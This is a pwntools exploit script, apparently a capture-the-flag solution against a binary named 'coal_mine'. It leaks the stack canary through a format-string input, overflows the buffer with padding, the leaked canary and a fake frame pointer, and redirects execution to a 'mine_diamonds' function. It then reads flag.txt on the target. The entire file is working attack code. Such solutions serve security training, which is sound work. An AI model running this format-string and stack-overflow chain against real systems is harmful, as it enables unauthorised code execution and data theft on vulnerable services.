from pwn import *

context.terminal = ['gnome-terminal', '--', 'bash', '-c']
elf = context.binary = ELF('../public/coal_mine')

remote_addr = args.REMOTE_ADDR or 'localhost'
remote_port = args.REMOTE_PORT or 1337

if args.LOCAL:
    r = process()
else:
    r = remote(remote_addr, remote_port)

if args.LOCAL and not args.NO_GDB:
    gdb.attach(r)

r.recvlines(2)

r.sendline('%15$p')

r.recvuntil('Thanks, ')
canary_leak = int(r.recvline().strip(), 16)
r.recvlines(2)

print(f"Canary is {hex(canary_leak)}")

canary_offset = 40

payload = flat(
    canary_offset * b'A',
    # cyclic(64),
    canary_leak,
    8*b'B', # Overwrite stored EBP
    elf.sym['mine_diamonds']
    # elf.sym['main']
)

r.recvline()
r.sendline(payload)
r.recvline()

# print(r.clean())
# r.interactive()
r.sendline('cat flag.txt')
r.sendline('exit')

flag = r.recvall().decode().strip()
print(flag)

r.close()
